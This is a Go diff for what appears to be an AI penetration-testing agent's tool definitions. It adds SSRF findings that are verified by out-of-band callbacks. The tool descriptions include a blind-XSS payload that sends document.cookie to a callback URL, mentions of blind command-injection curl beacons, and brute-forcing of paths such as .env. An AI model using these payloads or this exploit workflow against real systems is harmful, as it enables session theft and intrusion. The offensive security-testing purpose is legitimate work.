@@ -107,6 +107,12 @@ var requiredIndicator = map[string]string{
 	// server-side template injection: the engine COMPUTED an arithmetic probe (product present, literal
 	// gone) — a top web-vuln class the agent exploits but previously could not RECORD.
 	"ssti": "ssti_eval", "template_injection": "ssti_eval", "ssti_rce": "ssti_eval",
+	// (blind) server-side request forgery: the ONLY grounded signal is the target reaching back to the
+	// attacker-controlled OOB URL. oob_interaction is set ONLY by oob_check on a REAL recorded callback
+	// (the collector logged the inbound hit — §10), so it is false-positive-free by construction. This is
+	// the top exploitation-verified SSRF finding; in-band SSRF (response reflects fetched internal content)
+	// stays harder to ground generically and is not mismapped here.
+	"ssrf": "oob_interaction", "blind_ssrf": "oob_interaction", "server_side_request_forgery": "oob_interaction",
 }
 
 // supportedClasses lists the record_finding classes (the requiredIndicator keys), sorted, so the
@@ -135,7 +141,7 @@ func tools() []toolDef {
 		{"discover_content", "discover_content(url?, params_for?) — find HIDDEN surface that isn't linked in the HTML. Default (or url=<base>): brute a small wordlist of common unlinked paths (admin.php, private.php, .env, backup.sql, …) and report those that exist (differential vs a 404 baseline) — the pages recon can't see. params_for=<page-url>: brute common server-side param names (file, page, id, cmd, debug, …) and report which CHANGE that page's response — the hidden inputs a form doesn't show. Grounded (no invented surface); found paths become known routes. Use it early when the visible surface looks too small for the vuln.", tDiscoverContent},
 		{"graphql_introspect", "graphql_introspect(url?) — POST the GraphQL introspection query to a /graphql endpoint (defaults to <target>/graphql) and get the schema DISTILLED into queries, mutations (state-changing — prime authz/IDOR targets), and type names. The recon step for any GraphQL API; if introspection is disabled it says so. Then craft queries/mutations with send_request.", tGraphQL},
 		{"browser_render", "browser_render(url) — load a page in a REAL headless browser and run its JavaScript. Reports js_executed (a JS dialog fired = your XSS EXECUTED in the DOM — the proof reflected HTML source can't give), console output, the rendered DOM, and any OOB beacon it triggered. Use for reflected/DOM/stored XSS: put the payload in the url (or store it first via send_request), then render the page that displays it. A class=dom_xss/stored_xss finding is grounded by js_executed.", tBrowserRender},
-		{"record_finding", "record_finding(route, class, evidence[], severity, rationale) — commit a vuln. class ∈ sqli|blind_sqli|xss|dom_xss|stored_xss|ssti|open_redirect|path_traversal|lfi|xxe|command_injection|rce|default_credentials. REJECTED unless a cited turn carries the deterministic indicator for that class (e.g. ssti needs ssti_eval — a {{A*B}} probe with MULTI-DIGIT factors so the product is >=4 digits, e.g. {{1234*1234}}, NOT the textbook {{7*7}}: a tiny product like 49 is too collision-prone to ground, so it never fires the indicator even though the page shows it; the engine returns the computed product; xxe needs file_disclosure — the external-entity'd file content in the response).", tRecord},
+		{"record_finding", "record_finding(route, class, evidence[], severity, rationale) — commit a vuln. class ∈ sqli|blind_sqli|xss|dom_xss|stored_xss|ssti|ssrf|open_redirect|path_traversal|lfi|xxe|command_injection|rce|default_credentials. REJECTED unless a cited turn carries the deterministic indicator for that class (e.g. ssti needs ssti_eval — a {{A*B}} probe with MULTI-DIGIT factors so the product is >=4 digits, e.g. {{1234*1234}}, NOT the textbook {{7*7}}: a tiny product like 49 is too collision-prone to ground, so it never fires the indicator even though the page shows it; the engine returns the computed product; xxe needs file_disclosure — the external-entity'd file content in the response; ssrf needs oob_interaction — mint an oob_url(), put it in the vulnerable fetch/url param, then oob_check(token): a recorded callback PROVES the target made the request and emits a citable turn to cite here).", tRecord},
 		{"confirm_exploit", "confirm_exploit(finding_id) — re-fire the proving request in isolation; the indicator must reproduce to mark the finding Verified (eliminates flaky false positives).", tConfirm},
 		{"oob_url", "oob_url() — mint an out-of-band callback URL (your own interactsh). Embed it where a BLIND vuln would reach out: an SSRF target, a blind-XSS cookie beacon (<script>fetch('URL?c='+document.cookie)</script>), a blind-cmdi curl. Returns a token.", tOOBURL},
 		{"oob_check", "oob_check(token?) — did the target call your OOB URL back? A recorded hit PROVES the blind interaction fired; the hit's query/body carries anything you exfil (a cookie, a flag). Omit token to see all callbacks.", tOOBCheck},
@@ -398,6 +404,17 @@ func tConfirm(cc *Context, args map[string]any) string {
 		turn, ok := cc.turn(tid)
 		if !ok || !hasIndicator(turn, want) {
 			continue
+		}
+		// OOB-grounded classes (ssrf) verify from the DURABLE recorded callback, not an HTTP re-fire: the
+		// signal is out-of-band (logged in the collector), not in any response body, so re-sending the
+		// request and re-deriving response indicators would never see it. A recorded hit is append-only +
+		// non-flaky, so a still-present callback for the proving turn's token is verification-grade.
+		if want == "oob_interaction" {
+			if cc.oob != nil && len(cc.oob.Hits(turn.Payload)) > 0 {
+				cc.Findings[idx].Verified = true
+				return fmt.Sprintf("VERIFIED %s — the recorded OOB callback (token %s) confirms the target reached the attacker-controlled URL.", id, turn.Payload)
+			}
+			return fmt.Sprintf("NOT reproduced — no OOB callback for token %q is recorded; cannot verify %s.", turn.Payload, id)
 		}
 		// Re-fire WITH the proving request's body — a POST-body injection (SSTI/SQLi/cmdi in the body,
 		// not the URL) can't reproduce without it, and a body-less re-fire would falsely report the real
